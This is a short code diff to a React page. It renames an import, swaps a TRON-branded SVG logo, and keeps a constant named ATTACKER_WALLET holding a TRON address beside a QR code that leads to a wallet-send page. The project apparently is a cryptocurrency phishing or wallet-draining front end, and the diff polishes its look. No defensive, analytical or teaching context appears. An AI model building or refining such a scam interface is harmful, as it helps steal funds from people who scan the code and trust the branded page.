@@ -1,11 +1,11 @@
 import React from "react";
 import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
 import { QRCodeSVG } from "qrcode.react";
-import WalletSend from "./wallet";
+import WalletSend from "./WalletSend";
 
 const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
-// Replace the current TRON_LOGO_B64 with this one:
-const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ViMjczNCIgZD0iTTEzLjcxIDMuMzYgMyAxMWw2LjU1IDYuNTVMMTkuOCA4LjNsLTYuMDktNC45NHptLTEuMyAxLjQ1IDQuOTMgNGwtNy41MSA3LjUxLTMuNjQtMy42NCA2LjIyLTcuODd6Ii8+PC9zdmc+";
+const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ViMmMzMSI+PHBhdGggZD0iTTEyIDJMMiA3bDEwIDUgMTAtNS0xMC01em0wIDlsMi41LTEuMjVMMTIgOC41bC0yLjUgMS4yNUwxMiAxMXptMCAyLjVsLTUtMi41LTUgMi41TDEyIDIybDEwLTguNS01LTIuNS01IDIuNXoiLz48L3N2Zz4=";
+
 function HomePage() {
   const navigate = useNavigate();
   const qrValue = `${window.location.origin}/wallet`;
